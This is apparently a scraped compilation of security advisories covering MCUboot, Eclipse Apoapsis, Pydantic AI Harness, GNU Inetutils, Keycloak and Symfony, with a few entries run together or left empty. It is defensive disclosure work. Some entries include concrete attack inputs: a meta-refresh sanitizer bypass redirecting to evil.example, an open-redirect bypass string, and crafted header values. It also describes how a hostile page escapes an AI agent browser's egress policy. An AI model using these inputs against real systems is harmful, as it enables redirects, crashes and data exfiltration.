title: MCUboot's PSA-crypto ECDSA adapter parses the RFC 5480 DER signature with parse_signature_from_rfc5480_encoding() in boot/bootutil/include/bootutil/crypto/ecdsa.h, which takes no…
desc:
MCUboot's PSA-crypto ECDSA adapter parses the RFC 5480 DER signature with parse_signature_from_rfc5480_encoding() in boot/bootutil/include/bootutil/crypto/ecdsa.h, which takes no length argument. bootutil_ecdsa_verify() explicitly discards the signature length ((void)slen;) and the parser walks the encoding using length bytes read from the buffer itself (r_len = sig[3], then a derived s_len), with no check that those offsets stay within the supplied signature. Because this parsing runs before psa_verify_hash(), a malformed signature triggers the read whether or not the signature is valid.

In bootutil_img_validate() (boot/bootutil/src/image_validate.c:404) the ECDSA signature TLV is gated only by len > sizeof(buf), since EXPECTED_SIG_LEN() is the constant 1 for ECDSA; len is attacker-controlled in the range 0..128 and is copied into the 128-byte stack buffer buf. With a crafted r_len (e.g. sig[3] = 255) the parser's memcpy reads roughly 130+ bytes past the end of buf, an out-of-bounds read of adjacent stack memory. Reaching the signature case only requires a key TLV that matches a trusted public key (public material), so the path is effectively pre-authentication.

The defect is gated to the PSA crypto backend (MCUBOOT_USE_PSA_CRYPTO) with MCUBOOT_SIGN_EC256/MCUBOOT_SIGN_EC384 (and MCUBOOT_SIGN_EC384 always builds with PSA); the in-tree CC310, TinyCrypt, and mbedTLS adapters use different decoders and are not affected. This is not a signature bypass: the over-read bytes feed a verification that fails closed and are never returned to the attacker, so there is no information leak. The impact is bounded to a possible fault/denial-of-service on memory layouts where the read crosses an unmapped region; on typical flat-memory MCUs it reads adjacent RAM without faulting.
This vulnerability was reported independently twice: by NVIDIA Project Vanessa on 2026-06-22, and by Kai Phan (@kaimandalic) on 2026-07-19 as GHSA-r44p-8v6p-hqv4, which is closed as a duplicate of this advisory. Both original reports are reproduced in full below. The second report additionally observes that bootutil_ecdsa_parse_public_key() discards its end pointer ((void)end;, ecdsa.h:446). That observation is correct, but it is not part of this vulnerability and is not counted in the severity: the buffer it parses is bootutil_keys[key_id].key, the compiled-in trusted key store (image_ecdsa.c:54-55), so no attacker-controlled data reaches that parse. It is a robustness gap on the same code path and should be closed alongside the signature-parser fix. Note also that the second report's proof-of-concept models the signature buffer as an 8-byte heap allocation and therefore reports a heap overflow; in MCUboot the buffer is the 128-byte stack array buf, gated by len > sizeof(buf), so the real over-read is of adjacent stack memory.

title: MCUboot's Espressif port omits zeroization of two sensitive stack buffers in boot/espressif/hal/src/flash_encrypt.c.
desc:
MCUboot's Espressif port omits zeroization of two sensitive stack buffers in boot/espressif/hal/src/flash_encrypt.c. In check_and_generate_encryption_keys(), the freshly generated XTS-AES flash-encryption key is held in the stack array keys[BLOCKS_NEEDED][32] (flash_encrypt.c:216), written to eFuse via esp_efuse_write_keys(), and the function returns (flash_encrypt.c:243) without scrubbing it. In esp_flash_encrypt_region(), the plaintext flash sector buffer buf (flash_encrypt.c:454) retains the last sector's cleartext at both the success and flash_failed returns. Neither path performs a memset/bzero/mbedtls_platform_zeroize, even though the same port already does bzero for key digests in boot/espressif/hal/src/secure_boot.c.

The affected code runs only on the Espressif port with CONFIG_SECURE_FLASH_ENC_ENABLED, and only during the one-time first-boot provisioning pass when flash encryption is not yet enabled (boot/espressif/main.c); on subsequent boots the buffers are never created. Recovering the residue requires an out-of-band stack/RAM-disclosure primitive — JTAG/debug halt, UART ROM download, a core/crash dump, or a warm-boot RAM scrape — captured during that single provisioning boot. Under the recommended CONFIG_SECURE_FLASH_ENCRYPTION_MODE_RELEASE plus secure boot, those channels are fused off and no exposure exists.

The practical impact is a low-severity, defense-in-depth hardening gap: a flash-encryption key (and last plaintext sector) may linger in bootloader stack memory. Because the eFuse key block is burned read+write-protected, the transient stack copy is the only readable copy, and only during one boot; in a development build where a disclosure channel is open, an attacker with that capability can usually already read the still-plaintext flash directly, so the marginal confidentiality gain is small. Confirming real-world recovery depends on a specific SoC/debug configuration not exercisable from source alone.

title: The vendored zcbor decoder's zcbor_any_skip() in boot/zcbor/src/zcbor_decode.c descends one C-stack frame per level of CBOR nesting.
desc:
The vendored zcbor decoder's zcbor_any_skip() in boot/zcbor/src/zcbor_decode.c descends one C-stack frame per level of CBOR nesting. On a list or map it copies the decoder state (memcpy(&state_copy, state, sizeof(zcbor_state_t))) and recurses once per member, with no depth cap: the skip path does not use zcbor's backup stack, and ZCBOR_MAX_ELEM_COUNT is SIZE_MAX, so nothing bounds how deep the recursion goes.

That function is reached on attacker-controlled bytes before any authentication. MCUboot's serial-recovery command parser decodes SMP/CBOR requests with zcbor_map_decode_bulk() (boot/boot_serial/src/zcbor_bulk.c), which skips any map key it does not recognise by calling zcbor_any_skip() on the encoded value; the echo handler in boot/boot_serial/src/boot_serial.c calls it directly on the same footing. Both run during image upload, long before the uploaded image's signature is checked. The default receive buffer is MCUBOOT_SERIAL_MAX_RECEIVE_SIZE = 512 bytes and each nesting level costs a single byte to encode (0x81), so roughly 500 levels of nesting fit in one request — comfortably more than a bootloader's stack can absorb, since every frame carries a full zcbor_state_t copy plus locals.

The impact is availability only: the bootloader's stack overflows and the device faults or hangs during recovery. There is no controlled out-of-bounds write that escapes the DFU buffer, no disclosure, and no authentication bypass — the recursion grows the stack with the decoder's own internal state. Whether a given board actually exhausts its stack depends on that board's bootloader stack size, which we did not measure; the fix is nevertheless unconditional, because an unauthenticated pre-authentication code path must not have its safety depend on a per-board stack margin.

Exposure requires MCUBOOT_SERIAL (serial/SMP recovery), which is not enabled by default, and recovery entry is normally gated on a physical pin (CONFIG_BOOT_SERIAL_ENTRANCE_GPIO / PIN_RESET), with a no-valid-image fallback path. Products that expose serial recovery over an externally reachable transport, or that fall into recovery when no valid image is present, are the ones at risk.

The fix is to bound the skip: thread a recursion-depth counter through zcbor_any_skip() (or have zcbor_map_decode_bulk() reject values nested beyond a small constant) and fail once the limit is exceeded — equivalently, take the bounded-skip implementation from upstream zcbor.

title: The Cypress/PSoC6 flash-map backend in boot/cypress/cy_flash_pal/cy_flash_map.c guards every flash access with assert() against the wrong struct field.
desc:
The Cypress/PSoC6 flash-map backend in boot/cypress/cy_flash_pal/cy_flash_map.c guards every flash access with assert() against the wrong struct field. flash_area_read(), flash_area_write(), and flash_area_erase() check assert(off < fa->fa_off) and assert(off + len < fa->fa_off), comparing the area-relative off against the partition's absolute base address fa->fa_off instead of its length fa->fa_size. Because fa_off is a large absolute address, realistic out-of-partition offsets pass the check even in a debug build, and under NDEBUG the asserts are removed entirely. The access then proceeds as memcpy() (or a flash row op) at fa->fa_off + off with no enforcement.

The MCUboot core does not bound image-region offsets itself; it relies on flash_area_read() returning an error. During pre-authentication image validation, bootutil_img_hash() in boot/bootutil/src/bootutil_img_hash.c loops over ih_hdr_size + ih_img_size + ih_protect_tlv_size — all attacker-controlled header fields of the still-unverified update image — calling flash_area_read(), and the TLV iterator in boot/bootutil/src/tlv.c reads attacker-derived offsets the same way. An attacker who can stage a crafted image in the secondary/update slot (via OTA, DFU, or serial recovery, depending on the product) declares an oversized ih_img_size, causing reads far past the partition. A correct backend would reject these and fail validation cleanly; the Cypress backend does not.

The out-of-bounds access is in the source address of the copy — the destination buffer is correctly sized — so there is no memory corruption, no information disclosure to the attacker (the data is only folded into a hash that still fails the signature check), and no authentication bypass. The realistic impact is a bus fault or hang when the computed absolute address lands on an unmapped or peripheral region of the PSoC6 address map: the bootloader crashes instead of rejecting the bad image, an availability (denial-of-service) impact. The defect is specific to the Cypress/PSoC6 port; mainline Zephyr/sim/mynewt backends are unaffected. The identical broken guard in the write/erase primitives is a latent out-of-bounds-write gap, but no attacker-controlled out-of-bounds offset was found to reach those (serial-recovery uploads are bounded by the core), so the reachable memory-safety bug is the out-of-bounds read.

title: When MCUboot resumes an interrupted image swap it takes the number of bytes to move straight from the flash-resident status trailer.
desc:
When MCUboot resumes an interrupted image swap it takes the number of bytes to move straight from the flash-resident status trailer. In boot_swap_image() (boot/bootutil/src/loader.c) the fresh-swap branch recomputes copy_size from the image headers and is bounded — swap_run() in boot/bootutil/src/swap_move.c carries an explicit "not enough free space" check (last_idx >= first_trailer_idx) — but that check runs only inside if (boot_status_is_reset(bs)). On the resume branch the code instead does boot_read_swap_size(fap, &bs->swap_size); copy_size = bs->swap_size; and passes the value to swap_run() with no re-derivation and no bound.

swap_run() turns that byte count into a sector index by summing sector sizes until it reaches the count, with no ceiling on the real sector count: find_last_idx() in swap_move.c and swap_offset.c, and find_last_sector_idx() in swap_scratch.c, are all while (1) loops. The resulting index is fed to boot_img_sector_off() / boot_img_sector_size() (boot/bootutil/src/bootutil_priv.h), which index the fixed BOOT_MAX_IMG_SECTORS sectors[] arrays with no bounds check. Past num_sectors the loop reads zero-initialised — and past BOOT_MAX_IMG_SECTORS, adjacent-struct — entries; a sector size of 0 makes the loop never terminate, and a bogus computed offset is handed to boot_erase_region() / boot_copy_region() as an out-of-bounds flash erase or copy.

MCUboot itself only ever writes a validated, slot-bounded swap_size (swap_misc.c, fixup_revert()), so reaching the defect requires writing the trailer from outside. Serial recovery provides exactly that: an upload writes attacker bytes contiguously from offset 0 of the primary slot (boot/boot_serial/src/boot_serial.c, via flash_area_id_from_multi_image_slot()), bounded only by img_size <= area_size, so it controls the whole trailer — magic, swap_info, op/idx/state and swap_size. The resume gate boot_status_is_reset() keys solely on those op/idx/state fields, and boot_find_status() explicitly trusts valid magic as implying valid metadata. A forged in-progress status with an oversized swap_size therefore drives the unbounded walk during swap setup — before the primary image's signature is validated, and serial recovery is unauthenticated by design.

The outcome is an out-of-bounds flash erase or copy, or a non-terminating loop, inside the bootloader: an unbootable or bricked device, with the possibility of bootloader memory corruption. That exceeds what serial recovery is designed to grant, which is only the ability to stage an image that must still pass signature verification.

Exposure requires a swap-based update backend — MCUBOOT_SWAP_USING_MOVE (the default for swap builds), MCUBOOT_SWAP_USING_SCRATCH or MCUBOOT_SWAP_USING_OFFSET; overwrite-only, direct-XIP and RAM-load builds are unaffected — together with MCUBOOT_SERIAL_RECOVERY. Without serial recovery the path is only reachable by an attacker who can already write flash directly, which is outside the threat model.

The fix is to treat the trailer's swap_size as untrusted: reject or clamp it in boot_swap_image() before it becomes copy_size, bounding it by the primary slot's usable image area (sector count x sector size, excluding the trailer) rather than the raw flash_area_get_size(), and aborting recovery with a non-zero error on overflow. The same guard should cover the independent boot_read_swap_size() reads in each backend's boot_read_image_header().

title: Summary MCUboot enforces several security-critical invariants on the boot, image-swap, and validation paths using assert().
desc:
Summary

MCUboot enforces several security-critical invariants on the boot, image-swap, and validation paths using assert(). In a standard release/production build (NDEBUG defined) assert() expands to a no-op, so an invariant the code intends to halt on instead falls through, and execution continues with the bad or inconsistent state. Where the guarded condition is attacker-influenceable through the flash-write boundary (serial-recovery / DFU), this is a security check that is simply absent in release builds.

This is one root cause (assert-as-security-guard, no-op under NDEBUG) with one fix approach (replace the security-critical asserts with real fail-closed checks), so it is filed as a single advisory covering the enumerated sites.

Worst reachable instance — inconsistent swap status completes the swap without validation

In the swap-resume status read, an inconsistent status (erased_sections > 1) is detected, logged, and — when MCUBOOT_VALIDATE_PRIMARY_SLOT is disabled — is meant to abort, because "there is no way to be sure the swapped primary slot is OK." The abort is assert(0):

boot/bootutil/src/swap_move.c:181-194 — if (erased_sections > 1) { ... #if !defined(MCUBOOT_VALIDATE_PRIMARY_SLOT) / ... abort! / assert(0); #endif }, then execution falls through to compute bs->op/idx/state from the inconsistent status (lines 197-208) and return 0 (success).
boot/bootutil/src/swap_offset.c:266-280 — identical pattern; falls through to bs->op/idx/state and return 0.
boot/bootutil/src/swap_scratch.c:227-241 — same invalid/assert(0) pattern for the scratch backend.

Under NDEBUG with primary-slot validation off, the inconsistent status is neither aborted (assert is a no-op) nor re-validated (validation off), so boot_complete_partial_swap() finishes the swap on inconsistent metadata and the primary slot is booted without a signature check. An attacker who can write the swap-status trailer can craft the inconsistent status.

Reachability (threat model). Secondary slot + scratch trailers are A2-writable by definition (that is what a DFU upload is). Under MCUBOOT_SERIAL_RECOVERY the primary trailer is A2-writable too: boot/boot_serial/src/boot_serial.c:978 opens flash_area_id_from_multi_image_slot(img_num, 0) (== primary) and writes from offset 0 bounded by area_size, so it can paint the primary swap-status/magic. This is how the A2 (recovery/DFU, unauthenticated by design) attacker influences the guarded condition. Property violated: P1 (image authenticity / secure-boot bypass) when un-revalidated content is booted, and P6 (boot/recovery availability).

Second reachable instance — resume-path swap_size from an unguarded trailer

boot/bootutil/src/loader.c:1190-1193: the swap resume branch does fap = boot_find_status(...); assert(fap != NULL); rc = boot_read_swap_size(fap, &bs->swap_size); assert(rc == 0);. boot_find_status() (boot/bootutil/src/bootutil_misc.c:166-204) searches {scratch, primary} and, on no-valid-magic-match, returns the last-iterated area (primary), not NULL — so assert(fap != NULL) cannot fire even in debug, and under NDEBUG neither assert fires. swap_size is then read from an A2-writable (serial-recovery primary, or scratch) trailer with no fail-closed handling. This is the same swap-metadata-trust family as the recorded resume/swap_size disclosure.

Reachable-security sites (center the fix here)

1. boot/bootutil/src/swap_move.c:193 — inconsistent-status assert(0), falls through to complete swap. A2 + !VALIDATE_PRIMARY. [worst]
2. boot/bootutil/src/swap_offset.c:278 — same, swap-offset backend.
3. boot/bootutil/src/swap_scratch.c:239 — same, swap-scratch backend.
4. boot/bootutil/src/loader.c:1191 and :1193 — resume assert(fap != NULL) / assert(rc == 0) guarding swap_size read from an A2-writable trailer; compounded by boot_find_status() never returning NULL.

(Truncated. The full description is in the advisory: https://github.com/mcu-tools/mcuboot/security/advisories/GHSA-cr9j-p626-pwcc)

title: MCUboot's encrypted serial-recovery path contains an attacker-controlled out-of-bounds stack write in decrypt_region_inplace() in boot/boot_serial/src/boot_serial_encryption.c.
desc:
MCUboot's encrypted serial-recovery path contains an attacker-controlled out-of-bounds stack write in decrypt_region_inplace() in boot/boot_serial/src/boot_serial_encryption.c. The routine decrypts an uploaded encrypted image one flash sector at a time into a sector-sized stack VLA buf[sz], but when the current sector is still inside the image header it sets the destination index to the absolute header size (idx = hdr->ih_hdr_size; at boot/boot_serial/src/boot_serial_encryption.c:156) and then decrypts into &buf[idx]. The correct sibling routine boot/bootutil/src/loader.c:876 uses the sector-relative idx = hdr->ih_hdr_size - abs_off; the serial path is missing the - abs_off term, so for any sector after the first the index runs past the end of the stack buffer.

The ih_hdr_size field is a uint16_t taken verbatim from the uploaded image header. On the second sector onward, when ih_hdr_size exceeds the sector size, &buf[idx] points beyond buf and boot_enc_decrypt() writes attacker-controlled plaintext into adjacent stack frames. The path is reached pre-authentication: bs_upload() calls boot_handle_enc_fw() (boot/boot_serial/src/boot_serial.c:1208) after upload, and the pre-decryption signature gate in decrypt_image_inplace() is compiled out (#if 0 at boot/boot_serial/src/boot_serial_encryption.c:226-233), so the header is never validated before decryption.

A second error in the same window computation affects the first sector. When a sector holds both the end of the header and the start of the TLV area, the decrypt length is clamped to tlv_off - (off + bytes_copied), measured from the start of the sector rather than from idx (boot/boot_serial/src/boot_serial_encryption.c:166). An encrypted image whose header and payload end within the first sector is therefore decrypted for ih_hdr_size bytes more than it should be: into the TLV area and, when the image ends near the end of the sector, past buf. This form needs no oversized header, so even an ordinary small encrypted image can trigger it, and it reaches devices with sectors of up to about 128 KiB rather than only those whose sector is smaller than the 16-bit ih_hdr_size.

Reaching the sink requires a build with MCUBOOT_ENC_IMAGES and serial recovery enabled, and access to the device's serial/USB recovery interface (unauthenticated by design). With the public-key encryption schemes the AES content key is wrapped to the device's public encryption key, so an attacker can author a fully crafted encrypted image — including a malicious ih_hdr_size — without the image-signing private key. The result is a controllable stack memory-corruption inside the bootloader before any signature check, providing a path to code execution in the secure-boot root of trust that bypasses image authentication, as well as a denial-of-service. A 2048-byte out-of-bounds write was reproduced under AddressSanitizer (sz=4096, off=4096, ih_hdr_size=6144).

On releases before v2.0.0 (v1.9.0 and v1.10.0) the destination is a file-scope static uint8_t buf[SOC_FLASH_ERASE_BLK_SZ] in .bss rather than the stack VLA described above — the code then lived in boot/zephyr/single_loader.c, before commit c9fa6088 relocated it to boot/boot_serial/src/boot_serial_encryption.c and changed the buffer's storage class. The out-of-bounds write is equally real and equally pre-authentication on those releases, but it corrupts adjacent static data rather than the stack, so a stack-smashing proof of concept written against a current release will not reproduce as-is there.

title: In the `setup-osc` GitHub Action of Eclipse Apoapsis, from commit 4e9eaff up to, but not including, commit 03efc4c, the ORT Server version returned by the `/api/v1/versions`…
desc:
In the `setup-osc` GitHub Action of Eclipse Apoapsis, from commit 4e9eaff up to, but not including, commit 03efc4c, the ORT Server version returned by the `/api/v1/versions` endpoint is inserted into a shell script via a GitHub Actions expression without validation. An attacker who controls the responses of the configured ORT Server, for example by compromising the server, can execute arbitrary commands on the GitHub Actions runner and access the secrets available to the calling workflow.



The issue is fixed in commit 03efc4c, which only accepts version strings consisting of alphanumeric characters, `.`, `+`, and `-`.

title: In Eclipse Apoapsis ORT Server versions 0.1.0 to 0.83.0, the file-based configuration providers do not restrict resolved file paths to the configured directory.
desc:
In Eclipse Apoapsis ORT Server versions 0.1.0 to 0.83.0, the file-based configuration providers do not restrict resolved file paths to the configured directory. An authenticated user who is allowed to trigger an ORT run for a single repository can use `../` sequences or absolute paths in `reporter-template://` references of the reporter job configuration to make the reporter worker read arbitrary files and include them in the generated reports. This discloses files such as environment variables, mounted secrets, and configuration files that contain credentials shared across all tenants of the server.



The issue is fixed in Eclipse Apoapsis ORT Server 0.84.0.

title: Pydantic AI Harness's PlaywrightBrowser enforces its egress policy on HTTP requests and page WebSockets, but not on WebRTC or WebTransport connections, WebSockets opened with…
desc:
Pydantic AI Harness's PlaywrightBrowser enforces its egress policy on HTTP requests and page WebSockets, but not on WebRTC or WebTransport connections, WebSockets opened with WebSocketStream, or the requests the browser itself sends for FedCM. A page the agent opens can make the browser send WebRTC (STUN and TURN), WebTransport and WebSocketStream traffic, and FedCM requests, to hosts and ports that the policy refuses, including under a policy that limits every request kind to an allowlist.

This affects applications that use PlaywrightBrowser to open pages an attacker can influence. The traffic is each protocol's connection setup, sent to a destination the page chooses. A page can learn whether a target answers a STUN request. No response body from an ordinary internal service was readable through WebRTC, WebTransport or FedCM. A WebSocketStream is an ordinary WebSocket that the WebSocket guard does not see, opened from a page, a frame or a worker, and the page reads what the server sends, including from a private address. Chromium's Local Network Access blocks WebTransport from public pages to private addresses, but does not block WebRTC.

A FedCM call (navigator.credentials.get with an identity provider) makes the browser fetch the provider's /.well-known/web-identity, config, accounts and client metadata URLs. The page chooses the config URL's path and the client ID, so it can send data to a host outside allowed_domains or listed in blocked_domains. The accounts request carries the provider's cookies from the browser profile. FedCM requires a provider origin that is HTTPS or loopback.

The assumed attacker is a third party with no access to the application who controls script on a page the agent opens.

Under an enforced egress policy, which is the default, pydantic-ai-harness 0.74.0 removes RTCPeerConnection, webkitRTCPeerConnection, WebTransport, WebSocketStream, IdentityCredential and IdentityProvider from every page and frame, refuses FedCM calls to navigator.credentials.get, and launches Chromium with FedCM and WebSocketStream turned off. These paths stay outside the policy: WebTransport from workers; WebSocketStream from workers in a browser reached over cdp_url; WebTransport in sandboxed iframes that Chromium runs in their own process (headless=False and cdp_url); and documents loaded before attachment under cdp_context='default'.

Upgrade pydantic-ai-harness to 0.74.0 or later. For the paths the upgrade leaves open, and until you upgrade, run the browser behind a network egress filter that also covers UDP, or do not open untrusted URLs with PlaywrightBrowser.

desc: COVESA Open1722 before 0.9.8 contains an out-of-bounds read vulnerability in Avtp_Vss_CalcVssPathLength in src/avtp/acf/custom/Vss.c, which reads the INTEROP path-length prefix without checking the declared ACF message length. title: GNU Inetutils talkd Stack-based Buffer Overflow Denial-of-Service Vulnerability.
desc:
GNU Inetutils talkd Stack-based Buffer Overflow Denial-of-Service Vulnerability. This vulnerability allows remote attackers to create a denial-of-service condition on affected installations of GNU Inetutils. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the processing of announce requests. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to create a denial-of-service condition on the system. Was ZDI-CAN-29120.

title: GNU Inetutils FTP Client File Retrieval Command Injection Remote Code Execution Vulnerability.
desc:
GNU Inetutils FTP Client File Retrieval Command Injection Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of GNU Inetutils FTP Client. User interaction is required to exploit this vulnerability in that the target must interact with a malicious FTP server.

The specific flaw exists within the processing of filenames. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the current user. Was ZDI-CAN-29119.

desc: A flaw was found in Red Hat Enterprise Linux's qemu-kvm virtualization software. title: A flaw was found in the keycloak-services component of Keycloak, which is used for managing authentication and authorization flows.
desc: A flaw was found in the keycloak-services component of Keycloak, which is used for managing authentication and authorization flows. The issue occurs when a client policy is configured to enforce a high-assurance authentication flow requiring OTP. Due to improper validation of existing sessions, a lower-assurance password-only SSO session can be incorrectly accepted if the request does not explicitly demand a specific assurance level. This allows an attacker with access to a user's password or session to bypass the second factor and obtain tokens claiming a higher level of security.

title: When the proxy option isn't set, HttpClient takes the proxy from environment variables like http_proxy or HTTP_PROXY.
desc:
When the proxy option isn't set, HttpClient takes the proxy from environment variables like http_proxy or HTTP_PROXY. On web servers, it ignores HTTP_PROXY, because PHP puts the Proxy request header there (the httpoxy issue). On the CLI SAPI, it read HTTP_PROXY from $_SERVER, where PHP also puts the environment.

HTTP workers that run under the CLI SAPI put the headers of each request in $_SERVER too. This is the case of spiral/roadrunner-http, which the RoadRunner runner of php-runtime uses, and of baldinof/roadrunner-bundle and php-pm. A client could then send a Proxy header to choose the proxy of the requests that the application sent while handling its request. That proxy received the full requests to http:// URLs, with their credentials, and could forge the responses. For https:// URLs, it learned the host and port through CONNECT.

NativeHttpClient is affected since Symfony 4.3.0, AmpHttpClient since 5.1.0, and CurlHttpClient since 4.4.40, 5.4.7 and 6.0.7.

On the CLI SAPI, HTTP_PROXY is now read from the environment with $_ENV and getenv(), never from $_SERVER. Other SAPIs still ignore it.

title: Since Symfony 7.2, expressions can contain comments.
desc:
Since Symfony 7.2, expressions can contain comments. The lexer used a regular expression to find the end of a comment. When a /* was never closed, this regular expression scanned the rest of the expression, and the lexer then went on with the next character. So each /* scanned the rest of the expression again. Linting 192 KB of /*  took 9 to 11 seconds, and 96 KB took 34 seconds without PCRE JIT.

The lexer runs before the parser and its nesting limit. Any code that lints or parses untrusted expressions is affected, including the ExpressionSyntax validation constraint. A Length constraint on the same value doesn't help, since the validator runs both constraints.

The lexer now uses strpos() to find the end of a comment, and a comment that is never closed throws a SyntaxError. Such expressions were already invalid. Lexing takes linear time again.

title: The fix for CVE-2017-16652 restricts the redirects of HttpUtils::createRedirectResponse() to the host of the request.
desc:
The fix for CVE-2017-16652 restricts the redirects of HttpUtils::createRedirectResponse() to the host of the request. When framework.session.cookie_domain is set, it also allows the subdomains of that domain. To check a target, it read the host of the URL up to the first "/". But browsers also end the host at "\", "?" and "#". So with the cookie domain .example.com, a target like https://evil.test?.example.com passed the check, and the browser went to evil.test.

Applications are exposed when framework.session.cookie_domain is set. The default success and failure handlers of form_login redirect to the _target_path or _failure_path of the request. A login link can then send the user to another site right after a successful login, for example to ask for the password again.

HttpUtils now ends the host of a target where browsers do, before checking it against the allowed domains.

title: Since Symfony 7.4.0, FrameworkBundle chooses the error renderer from the runtime mode of the application, which comes from the APP_RUNTIME_MODE env var.
desc:
Since Symfony 7.4.0, FrameworkBundle chooses the error renderer from the runtime mode of the application, which comes from the APP_RUNTIME_MODE env var. When this variable isn't set, the cli, phpdbg and embed SAPIs default to the CLI mode, and errors are rendered with CliErrorRenderer. This renderer dumps the whole exception, and it did so even when debug was off.

HTTP workers that run under the CLI SAPI and don't set APP_RUNTIME_MODE then sent these dumps as error responses in production. They contain the messages, file paths and traces of the exceptions. Some exceptions reference the request, like the access denied errors of access_control rules. Their dump then contains the server parameters, with all the environment variables of the application.

This affects, for example, the RoadRunner, Swoole and ReactPHP runners of php-runtime, and baldinof/roadrunner-bundle before 3.2.4. The worker mode of FrankenPHP sets the variable and isn't affected.

The CLI renderer is now used only in debug mode.

title: CsvEncoder::decode() splits each header cell on the key separator, .
desc:
CsvEncoder::decode() splits each header cell on the key separator, . by default, and nests the decoded rows one level per separator, with no limit. PHP frees nested arrays recursively, so freeing data that is nested deeply enough overflows the C stack and crashes the process. With a stack of 8 MB, a CSV body of 448 KB is enough.

Each row also builds all the levels of its headers again. With a deep header, a CSV body of 2 KB made of short rows allocates more than 128 MB. A body of 1 MB keeps the CPU busy for 10 seconds or more.

Any code that decodes untrusted CSV with the Serializer is affected. From Symfony 7.4.0, this included every #[MapRequestPayload] argument that doesn't restrict acceptFormat, until 7.4.23 and 8.1.11 stopped decoding CSV payloads by default.

CSV headers can now be nested up to 512 levels, the default depth of json_decode(). Decoding also stops when the rows go through more than 16 header levels, or create more than 4 arrays, per byte of data. A header row of up to 5 levels always fits, whatever the rows contain. Beyond these limits, decode() throws a NotEncodableValueException, which #[MapRequestPayload] turns into a 400 response.

title: The fix for CVE-2026-109449 made the expression parser check the nesting level of long expressions.
desc:
The fix for CVE-2026-109449 made the expression parser check the nesting level of long expressions. This check exists since Symfony 5.4.54, 6.4.48, 7.4.21 and 8.1.9. The parser builds a ?: b with the node of a used twice, and the check walked every path to every node. With nested short ternaries, the number of paths doubles at each level, so an expression of 256 bytes never finished parsing.

The expression needs no variable and no function. Any code that parses or lints untrusted expressions is affected, including the ExpressionSyntax validation constraint. evaluate() and compile() parse the expression first, so they hang too.

The nesting check now skips the nodes it already checked, so it takes linear time again. evaluate(), compile() and the messages of runtime errors now use the node of a once, so a is evaluated once, as in PHP.

title: DoctrineTokenProvider keeps a copy of the previous token of a remember-me cookie.
desc:
DoctrineTokenProvider keeps a copy of the previous token of a remember-me cookie. This way, concurrent requests sent with that token are still accepted for 60 seconds. The copy is stored in another row, under a series derived from the series of the cookie. Since Symfony 6.4.45, 7.4.18 and 8.1.6, a copy is stored for every series that the remember-me handler generates. Before, copies were stored only for the series created before Symfony 5.4.19, 6.0.19, 6.1.11 and 6.2.5.

A cookie could use the series of the copy instead of its own series. The copy then matched as a current token, so the limit of 60 seconds didn't apply and the theft detection didn't trigger. Logging out deleted only the row of the original series, and the copy stayed.

An attacker who got hold of a remember-me cookie could then keep logging in as its user after the user logged out. This works when the token was rotated at most once since the attacker got the cookie.

DoctrineTokenProvider now accepts only the series formats that the remember-me handler generates, whatever the collation of the database. It also deletes the copy together with its token.

title: Since Symfony 5.4.48, 6.4.16, 7.1.9 and 7.2.0, NoPrivateNetworkHttpClient prepares each request with the default options of the library.
desc:
Since Symfony 5.4.48, 6.4.16, 7.1.9 and 7.2.0, NoPrivateNetworkHttpClient prepares each request with the default options of the library. The decorator then passes all these options to the decorated client. Every option is then already set, so that client ignores its own default options.

When these defaults restrict TLS trust, the restriction is lost without any error. A client created with peer_fingerprint, a private cafile or a minimum crypto_method refuses a server on its own. Once decorated, the same client connects to that server. Someone on the network path with a certificate that the system trust store accepts can then read and answer the requests. Default proxy and max_redirects options were lost the same way. Since Symfony 8.1, DnsResolvingHttpClient is affected too.

This also applies to the default_options of FrameworkBundle, which configure the innermost client.

The decorator now passes the options given to it, plus the ones it manages itself. The decorated client then applies its own default options again.

title: Since Symfony 5.4.48, 6.4.16, 7.1.9 and 7.2.0, NoPrivateNetworkHttpClient follows redirects itself, and sends each hop as a new request through the client it decorates.
desc:
Since Symfony 5.4.48, 6.4.16, 7.1.9 and 7.2.0, NoPrivateNetworkHttpClient follows redirects itself, and sends each hop as a new request through the client it decorates. Before a redirect to another origin, it removes the Authorization and Cookie headers it knows about. But the decorated client then added its own default options again. These include the auth_basic, auth_bearer and auth_ntlm credentials, and the Authorization and Cookie headers it was created with. Credentials set with withOptions() on the decorator came back the same way, since the decorator forwards them to the decorated client.

These credentials were then sent to any origin that a response redirected to, for example through an open redirect on the server the application calls. The decorated client alone doesn't send them. The decorator removed the ones passed to request(), but not auth_ntlm. Since Symfony 8.1, DnsResolvingHttpClient follows redirects the same way and is affected too.

With auth_ntlm, curl started the NTLM handshake with the other origin, which could answer with a challenge to get the NTLM response of the application.

On a redirect to another origin, the decorator now passes empty Authorization and Cookie headers and unsets the auth_basic, auth_bearer and auth_ntlm options. The decorated client then can't add its own. Decorators between NoPrivateNetworkHttpClient and the transport, like ScopingHttpClient or CachingHttpClient, can't add theirs either.

title: MetaRefreshAttributeSanitizer checks the URL of a <meta http-equiv="refresh"> directive only when its content starts with a refresh time.
desc:
MetaRefreshAttributeSanitizer checks the URL of a <meta http-equiv="refresh"> directive only when its content starts with a refresh time. Since the fix for CVE-2026-121373, only the ASCII whitespace of the HTML specification could come before that time. Chromium-based browsers also skip a vertical tab and the Unicode spaces U+1680, U+2000 to U+200A, U+2028, U+205F and U+3000.

When the time followed one of these characters, the sanitizer returned the value unchanged. Its URL wasn't checked against allowLinkHosts() and allowLinkSchemes(), and Chromium followed it:

$sanitizer->sanitizeFor('head', "<meta http-equiv=\"refresh\" content=\"\u{3000}0;url=https://evil.example/\">");
// returned unchanged, and Chromium redirects to https://evil.example/

The vertical tab is a regression of the fix for CVE-2026-121373, since the expression used before matched it. The Unicode spaces have been accepted since the sanitizer of meta refresh directives exists.

This requires the configuration of CVE-2026-121373: meta elements allowed with their http-equiv and content attributes, for example with allowStaticElements(), and content sanitized with sanitizeFor('head', ...). Firefox and Safari skip only ASCII whitespace there.

The sanitizer now skips controls, Unicode whitespace and invisible characters before the time, so that it checks the URL of these directives too.

title: Since Symfony 7.3, the require_tls option of EsmtpTransport refuses to send a message over a connection that isn't encrypted.
desc:
